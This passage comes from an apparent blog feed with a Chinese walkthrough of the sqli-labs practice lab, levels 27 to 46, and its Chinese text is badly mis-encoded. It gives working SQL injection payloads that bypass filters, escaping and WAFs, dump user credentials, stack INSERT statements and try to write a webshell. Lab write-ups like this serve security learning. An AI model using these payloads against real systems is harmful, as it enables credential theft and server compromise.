preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>è¿™é‡Œå¯ä»¥ä½¿ç”¨å¤§å°å†™è¿›è¡Œç»•è¿‡ï¼Œå¦‚uNionã€sElectï¼Œæ–¹æ³•åŒä¸Š</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%27%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere%271=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118180520892.png" class>

<h2 id="0x10-Less-27a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·"><a href="#0x10-Less-27a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·" class="headerlink" title="0x10.Less-27a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·"></a>0x10.Less-27a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·</h2><p><code>åŒä¸Šéœ€å°†å•å¼•å·æ¢ä¸ºåŒå¼•å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0band%0b&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182211616.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182234928.png" class>

<p><code>æµ‹è¯•å­—æ®µæ•°</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3%0band%0b&quot;1&quot;=&quot;1</span><br><span class="line">?id=1&quot;%0buNion%0bsElect%0b1,2,3,4%0band%0b&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182105167.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182130359.png" class>

<p><code>æ”¾æ³•åŒä¸Šä¸€é¢˜ä¸åœ¨èµ˜è¿°</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118182421291.png" class>

<h2 id="0x11-Less-28-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·"><a href="#0x11-Less-28-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x11.Less-28 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·"></a>0x11.Less-28 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·</h2><p><code>é—­åˆå­—ç¬¦ä¸º&#39;)å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;)%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere(&#x27;1=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118191510874.png" class>

<h2 id="0x12-Less-28a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·"><a href="#0x12-Less-28a-GET-åŸºäºbool-è¿‡æ»¤-åŒå¼•å·" class="headerlink" title="0x12.Less-28a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·"></a>0x12.Less-28a GET åŸºäºbool è¿‡æ»¤ åŒå¼•å·</h2><p><code>é—­åˆå­—ç¬¦ä¸º&quot;å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&quot;%0buNion%0bsElect%0b1,group_concat(username,0x7e,password),3%0bfrom%0busers%0bwhere&quot;1=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118192025320.png" class>

<h2 id="0x13-Less-29-GET-åŸºäºæŠ¥é”™-ç»•è¿‡WAF"><a href="#0x13-Less-29-GET-åŸºäºæŠ¥é”™-ç»•è¿‡WAF" class="headerlink" title="0x13.Less-29 GET åŸºäºæŠ¥é”™ ç»•è¿‡WAF"></a>0x13.Less-29 GET åŸºäºæŠ¥é”™ ç»•è¿‡WAF</h2><p><code>è¯´æ˜¯å­˜åœ¨wafä½†æ˜¯å¸¸è§„æ³¨å…¥å°±å¯ä»¥ï¼Ÿä¸€è„¸æ‡µé€¼ã€‚ã€‚ã€‚</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users where &#x27;1=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118200656209.png" class>

<h2 id="0x14-Less-30-GET-åŸºäºbool-ç»•è¿‡WAF"><a href="#0x14-Less-30-GET-åŸºäºbool-ç»•è¿‡WAF" class="headerlink" title="0x14.Less-30 GET åŸºäºbool ç»•è¿‡WAF"></a>0x14.Less-30 GET åŸºäºbool ç»•è¿‡WAF</h2><p><code>è·Ÿä¸Šé¢˜ä¸€æ ·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&quot; union select 1,group_concat(username,0x7e,password),3 from users where&quot;1=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201045806.png" class>

<h2 id="0x15-Less-31-GET-åŸºäºbool-ç»•è¿‡WAF"><a href="#0x15-Less-31-GET-åŸºäºbool-ç»•è¿‡WAF" class="headerlink" title="0x15.Less-31 GET åŸºäºbool ç»•è¿‡WAF"></a>0x15.Less-31 GET åŸºäºbool ç»•è¿‡WAF</h2><p><code>è·Ÿä¸Šé¢˜ä¸€æ ·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&quot;) union select 1,group_concat(username,0x7e,password),3 from users where(&quot;1=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118201428847.png" class>

<blockquote>
<p>è¿™ä¸‰é“é¢˜å¾ˆå¥‡æ€ªï¼Œè¯´æ˜¯æœ‰wafä½†æ˜¯å•¥ä¹Ÿæ²¡æœ‰ã€‚ç»•è¿‡wafå‚è€ƒä»¥ä¸‹æ–‡ç« </p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHMvYXJ0aWNsZS9kZXRhaWxzLzc3NzU4ODI0">å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<p><code>ç¬¬ä¸€ä¸ªidå‚æ•°ç”¨äºæ¬ºéª—wafï¼Œç¬¬äºŒä¸ªä¸ºçœŸå®æŸ¥è¯¢</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) -- -</span><br><span class="line">?id=1&amp;id=1&quot;) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202113371.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118202142173.png" class>

<h2 id="0x16-Less-32-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x16-Less-32-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x16.Less-32 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x16.Less-32 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>è¿™é‡Œå†™å¼•å·ä¼šè¢«åŠ ä¸Š\è¿›è¡Œè½¬ä¹‰</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118212716561.png" class>

<p><code>å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚è¿›è¡Œç»•è¿‡ï¼Œæ±‰å­—ä½ çš„urlç¼–ç ä¸º%e4%bd%a0ï¼Œè¿™é‡Œæå–%e4ä¸\è¿›è¡Œæ‹¼æ¥ï¼Œä½†æ˜¯ä»–å¹¶ä¸æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œå°±å¯ä»¥ç»•è¿‡\</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118215012643.png" class>

<p><code>è€æ–¹æ³•ï¼Œç›´æ¥æŸ¥è¯¢</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220631992.png" class>

<p><code>çˆ†å­—æ®µ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users -- -</span><br></pre></td></tr></table></figure>

<p><code>ä½†æ˜¯è¿™é‡Œå‡ºç°äº†ä¸ªé—®é¢˜ï¼Œè¯´æ˜¯æ²¡æœ‰usersè§äº†é¬¼äº†ï¼Œä¸Šé¢æ˜æ˜æŸ¥å‡ºæ¥äº†å‘€</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118220853724.png" class>

<p><code>è¿™é‡Œå‘ç°usersè¢«åŠ ä¸Šäº†å•å¼•å·ï¼Œå¦‚ä½•é€ƒè„±è¿™ç§æŸç¼šå‘¢ï¼Œå°†usersè½¬ä¸º16è¿›åˆ¶ç¼–ç å³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118221744344.png" class>

<p><code>çˆ†æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222615247.png" class>

<h2 id="0x17-Less-33-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x17-Less-33-GET-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x17.Less-33 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x17.Less-33 GET ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>è·Ÿä¸Šä¸€é“é¢˜ä¸€æ¯›ä¸€æ ·ï¼Œæ€ªäº‹</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210118222957733.png" class>

<h2 id="0x18-Less-34-POST-ç»•è¿‡è½¬ä¹‰å­—ç¬¦"><a href="#0x18-Less-34-POST-ç»•è¿‡è½¬ä¹‰å­—ç¬¦" class="headerlink" title="0x18.Less-34 POST ç»•è¿‡è½¬ä¹‰å­—ç¬¦\"></a>0x18.Less-34 POST ç»•è¿‡è½¬ä¹‰å­—ç¬¦\</h2><p><code>åŒä¸Šä¸€é¢˜ï¼Œåªæ˜¯å­—æ®µæœ‰2ä¸¤ä¸ª</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname=1%e4&#x27; order by 3 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101637618.png" class>

<p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname=0%e4&#x27; union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119101747730.png" class>

<h2 id="0x19-Less-35-GET-ç»•è¿‡-ï¼ˆä¸éœ€è¦ï¼‰"><a href="#0x19-Less-35-GET-ç»•è¿‡-ï¼ˆä¸éœ€è¦ï¼‰" class="headerlink" title="0x19.Less-35 GET ç»•è¿‡\ï¼ˆä¸éœ€è¦ï¼‰"></a>0x19.Less-35 GET ç»•è¿‡\ï¼ˆä¸éœ€è¦ï¼‰</h2><p><code>è¿™é¢˜é†‰äº†ï¼Œè¯´æ˜¯ç»•è¿‡\ï¼Œä½†æ˜¯æ²¡æœ‰é—­åˆå­—ç¬¦ï¼ŒğŸ˜‚</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0 union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103112599.png" class>

<h2 id="0x20-Less-36-GET-ç»•è¿‡Mysql-real-escape-string"><a href="#0x20-Less-36-GET-ç»•è¿‡Mysql-real-escape-string" class="headerlink" title="0x20.Less-36 GET ç»•è¿‡Mysql_real_escape_string"></a>0x20.Less-36 GET ç»•è¿‡Mysql_real_escape_string</h2><blockquote>
<p> æŸ¥çœ‹æºç å‘ç°ï¼Œå‚æ•°ä¼šè¢«mysql_real_escape_stringè½¬ä¹‰</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>å®šä¹‰å’Œç”¨æ³•</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</span><br><span class="line"></span><br><span class="line"> \x00</span><br><span class="line"> \n</span><br><span class="line"> \r</span><br><span class="line"> \</span><br><span class="line"> &#x27;</span><br><span class="line"> &quot;</span><br><span class="line"> \x1a</span><br><span class="line"></span><br><span class="line">å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¯­æ³•</span></span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line"></span><br><span class="line">| å‚æ•°       | æè¿°                                                  |</span><br><span class="line">| :--------- | :---------------------------------------------------- |</span><br><span class="line">| string     | å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚                            |</span><br><span class="line">| connection | å¯é€‰ã€‚è§„å®š MySQL è¿æ¥ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥ã€‚ |</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> è¯´æ˜</span></span><br></pre></td></tr></table></figure>

<p>æœ¬å‡½æ•°å°† <em>string</em> ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œå¹¶è€ƒè™‘åˆ°è¿æ¥çš„å½“å‰å­—ç¬¦é›†ï¼Œå› æ­¤å¯ä»¥å®‰å…¨ç”¨äº <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX215c3FsX3F1ZXJ5LmFzcA==">mysql_query()<i class="fa fa-external-link-alt"></i></span>ã€‚</p>
<p><code>æµ‹è¯•é—­åˆå­—ç¬¦ï¼Œç»“æœä¸ºå•å¼•å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1%e4&#x27; and 1=1 -- -</span><br><span class="line">?id=1%e4&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103932605.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119104044212.png" class>

<p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103818736.png" class>

<h2 id="0x21-Less-37-POST-ç»•è¿‡Mysql-real-escape-string"><a href="#0x21-Less-37-POST-ç»•è¿‡Mysql-real-escape-string" class="headerlink" title="0x21.Less-37 POST ç»•è¿‡Mysql_real_escape_string"></a>0x21.Less-37 POST ç»•è¿‡Mysql_real_escape_string</h2><p><code>ä¸ä¸Šä¸€é¢˜ä¸€æ ·</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure>

<p><code>æŒ‰ç…§ä¸Šä¸€é¢˜çš„æ–¹æ³•ï¼Œä½†æ˜¯ç»“æœå¹¶ä¸æ˜¯æˆ‘æƒ³è±¡çš„é‚£æ ·ï¼Œé—­åˆå­—ç¬¦æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°ï¼Œäºæ˜¯æŠ“åŒ…å‘ç°%ä¼šè¢«ç¼–ç ä¸º%25</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111554948.png" class>

<p><code>æ‰€ä»¥å¯ä»¥å°†%25æ¢ä¸º%</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111930781.png" class>

<p><code>å…¶ä»–è¿‡ç¨‹åŒä¸Š</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname=admin%e4%27 union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119112040350.png" class>]]></content>
      <categories>
        <category>Sqli-labs</category>
      </categories>
      <tags>
        <tag>Sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli_labs_Page3(stacked)</title>
    <url>/2021/02/02/Sqli-labs-Page3-stack/</url>
    <content><![CDATA[<p><strong>Sqli_labs_Page3(stacked)</strong></p>
<p><strong>æœ¬ç¯‡å¤§éƒ¨åˆ†è€ƒå¯Ÿå †å æ³¨å…¥</strong></p>
<a id="more"></a>

<h2 id="0x01-Less-38-GET-å †å æ³¨å…¥-å•å¼•å·"><a href="#0x01-Less-38-GET-å †å æ³¨å…¥-å•å¼•å·" class="headerlink" title="0x01.Less-38 GET å †å æ³¨å…¥ å•å¼•å·"></a>0x01.Less-38 GET å †å æ³¨å…¥ å•å¼•å·</h2><p><code>ä½¿ç”¨å †å æ³¨å…¥å¯ä»¥è¿›è¡Œå¢åˆ æ”¹æŸ¥ç­‰æ“ä½œ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),3;insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure>

<p><code>çˆ†åº“çˆ†è¡¨çˆ†å­—æ®µç­‰æ“ä½œä¸åœ¨èµ˜è¿°ï¼Œå…ˆæŸ¥çœ‹æœªæ³¨å…¥ä¹‹å‰çš„æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130856987.png" class>

<p><code>å†æŸ¥çœ‹æ³¨å…¥ä¹‹åçš„æ•°æ®</code></p>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201130944171.png" class>

<h2 id="0x02-Less-39-GET-å †å æ³¨å…¥-æ•´å‹"><a href="#0x02-Less-39-GET-å †å æ³¨å…¥-æ•´å‹" class="headerlink" title="0x02.Less-39 GET å †å æ³¨å…¥ æ•´å‹"></a>0x02.Less-39 GET å †å æ³¨å…¥ æ•´å‹</h2><p><code>åŒless-38ï¼Œå°†å•å¼•å·å»æ‰å³å¯</code></p>
<h2 id="0x03-Less-40-GET-åŸºäºbool-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·"><a href="#0x03-Less-40-GET-åŸºäºbool-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x03.Less-40 GET åŸºäºbool å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·"></a>0x03.Less-40 GET åŸºäºbool å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·</h2><p><code>boolæ³¨å…¥ä¸åœ¨èµ˜è¿°ï¼Œä½¿ç”¨å¦‚ä¸‹payload</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;);insert into users values(22,&#x27;sha&#x27;,&#x27;gou&#x27;) -- -</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°æ’å…¥æˆåŠŸ</code></p>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201133805018.png" class>

<h2 id="0x04-Less-41-GET-åŸºäºbool-å †å æ³¨å…¥-æ•´å‹"><a href="#0x04-Less-41-GET-åŸºäºbool-å †å æ³¨å…¥-æ•´å‹" class="headerlink" title="0x04.Less-41 GET åŸºäºbool å †å æ³¨å…¥ æ•´å‹"></a>0x04.Less-41 GET åŸºäºbool å †å æ³¨å…¥ æ•´å‹</h2><p><code>åŒless-40ï¼Œå»æ‰&#39;)å³å¯</code></p>
<h2 id="0x05-Less-42-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥"><a href="#0x05-Less-42-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥" class="headerlink" title="0x05.Less-42 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥"></a>0x05.Less-42 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥</h2><p><code>è¿™é‡Œç‚¹å‡»æ³¨å†Œç”¨æˆ·å‡ºç°å¦‚ä¸‹é¡µé¢</code></p>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201135038039.png" class>

<p><code>æŸ¥çœ‹æºç å‘ç°ï¼Œpasswordæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæ­¤å¤„å¯ä»¥è¿›è¡Œæ³¨å…¥</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>

<p><code>æµ‹è¯•å‘ç°é—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201141358328.png" class>

<p><code>æ³¨å…¥</code></p>
<blockquote>
<p>è¿™é‡Œæ²¡æœ‰æƒ³åˆ°å¥½çš„åŠæ³•è¿›è¡Œçˆ†åº“çˆ†è¡¨çˆ†å­—æ®µï¼ˆèœæ˜¯åŸç½ªã€‚ã€‚ã€‚ï¼‰</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users values(55,&#39;de&#39;,&#39;de&#39;) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142502360.png" class>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201142524651.png" class>

<h2 id="0x06-Less-43-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·"><a href="#0x06-Less-43-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥-å•å¼•å·-æ‹¬å·" class="headerlink" title="0x06.Less-43 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·"></a>0x06.Less-43 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥ å•å¼•å·+æ‹¬å·</h2><p><code>åŒless-42ï¼Œå°†å•å¼•å·æ¢ä¸º&#39;)å³å¯</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users values(66,&#39;ha&#39;,&#39;ha&#39;) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201143741102.png" class>

<h2 id="0x07-Less-44-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind"><a href="#0x07-Less-44-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind" class="headerlink" title="0x07.Less-44 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind"></a>0x07.Less-44 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind</h2><p><code>åŒless42ï¼Œä½†æ­¤å¤„&#39;æ— å›æ˜¾</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insert into users values(32,&#x27;demo&#x27;,&#x27;demo&#x27;) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201144925798.png" class>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145028708.png" class>

<h2 id="0x08-Less-45-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind"><a href="#0x08-Less-45-POST-åŸºäºæŠ¥é”™-å †å æ³¨å…¥blind" class="headerlink" title="0x08.Less-45 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind"></a>0x08.Less-45 POST åŸºäºæŠ¥é”™ å †å æ³¨å…¥blind</h2><p><code>åŒless42ï¼Œé—­åˆå­—ç¬¦ä¸º&#39;)ï¼Œä»ç„¶æ— å›æ˜¾</code></p>
<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145317106.png" class>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201145302646.png" class>

<h2 id="0x09-Less-46-GET-åŸºäºæŠ¥é”™-æ•°å­—-order-by"><a href="#0x09-Less-46-GET-åŸºäºæŠ¥é”™-æ•°å­—-order-by" class="headerlink" title="0x09.Less-46 GET åŸºäºæŠ¥é”™ æ•°å­— order by"></a>0x09.Less-46 GET åŸºäºæŠ¥é”™ æ•°å­— order by</h2><p><code>æŸ¥çœ‹æºç å‘ç°sqlè¯­å¥å¦‚ä¸‹</code></p>
<blockquote>
<p>order by ä¸åŒäºwhereï¼Œorder by åä¸èƒ½æ‹¼æ¥union</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY $id&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>ç›´æ¥æ„é€ æŠ¥é”™è¯­å¥ï¼Œå…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>) -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/02/02/Sqli-labs-Page3-stack/image-20210201233943796.png" class>

<p><strong>skip</strong></p>
<p><code>è¿™é‡Œå¯ä»¥ä½¿ç”¨into outfileé…åˆlines  terminated by 0xå†™å…¥webshell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?sort=1 and into outfile &quot;C:\\phpStudy\\WWW\\less46.php&quot; lines  terminated by 3c3f7068700a706870696e666f28293b0a3f3e -- -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œç”±äºæ²¡æœ‰æƒé™æ‰€ä»¥å¤±è´¥äº†ï¼Œä½†è¿™ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„æ€è·¯ã€‚</p>
</blockquote>
